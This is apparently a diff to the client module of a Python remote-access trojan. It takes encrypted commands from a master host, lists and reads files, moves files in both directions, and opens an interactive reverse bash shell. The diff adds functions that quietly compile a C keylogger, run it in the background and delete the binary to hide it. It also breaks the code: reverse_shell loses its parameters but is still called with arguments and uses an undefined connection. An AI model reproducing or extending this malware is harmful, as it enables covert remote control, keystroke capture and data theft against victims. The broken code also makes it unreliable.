@@ -1,14 +1,15 @@
 from sys import exit
 from socket import socket, AF_INET, SOCK_STREAM
 from socket import error as socket_error
-from os import dup2, fork, listdir, getcwd
-from subprocess import run
+from os import dup2, fork, listdir, getcwd, system
+from subprocess import run, Popen, DEVNULL
 from time import sleep
 
-from .crypto import *
+
+from .crypto import crypto_run
 
 
-def reverse_shell(sh_conn, master_hostname, shell_port):
+def reverse_shell():
     pid = fork()
     if pid == 0:
         pid2 = fork()
@@ -19,8 +20,32 @@ def reverse_shell(sh_conn, master_hostname, shell_port):
             dup2(sh_conn.fileno(),1) 
             dup2(sh_conn.fileno(),2) 
             run(["/bin/bash","-i"])
-             # reborn(master_hostname, master_port)
+            # reborn(master_hostname, master_port)
     exit(0)
+
+def compile_keylogger():
+    pid = fork()
+    if pid == 0:
+        pid2 = fork()
+        if pid2 == 0:
+            # export cls="/usr/bin/gcc linux_keylogger/src/linux_keylogger.c -o top"
+            system("gcc linux_keylogger/src/keylogger.c -o keylogger >/dev/null 2>&1")
+            exit(0)
+        exit(0)
+
+def run_keylogger():
+    pid = fork()
+    if pid == 0:
+        pid2 = fork()
+        if pid2 == 0:
+            # ./top
+            sleep(2)
+            system("./keylogger &")
+            sleep(2)
+            system("rm keylogger")
+            exit(0)
+        exit(0)
+
 
 def send_res(conn, res):
     try:
@@ -33,6 +58,7 @@ def send_res(conn, res):
         exit(0)
     return conn
 
+
 def recv_cmd(conn, buffer):
     try:
         encrypted_cmd = conn.recv(buffer)
@@ -43,10 +69,12 @@ def recv_cmd(conn, buffer):
         # error connecting to master to recv data, reborn
         exit(0)
 
+
 def cmd_shell(conn, master_hostname, master_port):
     while True:
         conn, cmd = recv_cmd(conn, 1024)
         res = ""
+
         if cmd[:2] == "ls":
             res = ""
             if len(cmd) > 2:
@@ -56,8 +84,10 @@ def cmd_shell(conn, master_hostname, master_port):
             resp_list = listdir(path)
             for resp in resp_list:
                 res += resp + "\n"
+
         elif cmd[:3] == "pwd":
             res = str(getcwd())
+
         elif cmd[:3] == "cat":
             data = ""
             try:
@@ -66,6 +96,7 @@ def cmd_shell(conn, master_hostname, master_port):
                 res += data
             except:
                 res = "error opening file"
+
         elif cmd[:2] == "dl":
             filepath = cmd[3:]
             try:
@@ -75,16 +106,24 @@ def cmd_shell(conn, master_hostname, master_port):
             data = fp.read()
             fp.close()
             res = str(data)
+
         elif cmd[:2] == "pl":
             filename = "master_dl"
             conn, data = recv_cmd(conn, 64000)
             fp = open(filename, "w")
             fp.write(data)
             fp.close()
+
         elif cmd[:5] == "shell":
             shell_port = int(cmd[5:])
             sleep(1)
             reverse_shell(conn, master_hostname, shell_port)
+        
+        elif cmd[:6] == "keylog":
+            compile_keylogger()
+            run_keylogger()
+            res = "[*] Started keylogging"
+            conn = send_res(conn, res)
         else:
             res = "404could not find command"
             conn = send_res(conn, res)
